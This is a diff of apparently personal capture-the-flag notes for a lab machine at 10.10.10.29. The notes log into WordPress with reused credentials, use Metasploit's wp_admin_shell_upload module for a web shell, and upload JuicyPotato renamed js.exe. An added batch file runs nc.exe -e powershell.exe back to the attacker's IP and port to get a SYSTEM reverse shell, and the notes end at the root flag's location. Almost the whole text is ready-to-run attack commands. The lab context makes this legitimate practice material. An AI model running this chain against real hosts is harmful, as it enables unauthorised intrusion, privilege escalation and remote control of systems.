@@ -20,7 +20,7 @@ http://10.10.10.29/wordpress
 crendentials from previous box admin:P@s5w0rd!
 ------------------------------------------------------------
                 msfconsolE
- msf > use exploit/unix/webapp/wp_admin_shell_uploadmsf 
+ msf > use exploit/unix/webapp/wp_admin_shell_upload
 > set PASSWORD P@s5w0rd! 
 > set USERNAME admin
 > set TARGETURI /wordpress
@@ -43,4 +43,8 @@ upload juicy potato.exe
 changename js.exe
 upload js.exe
 execute js.exe
-command:
+command:echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe (IP and nc port) > shell.bat
+run shell.bat command:
+js.exe-t*-pC:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat-l 1337
+
+flag in C:\users\Administrator\Desktop\ root.txt
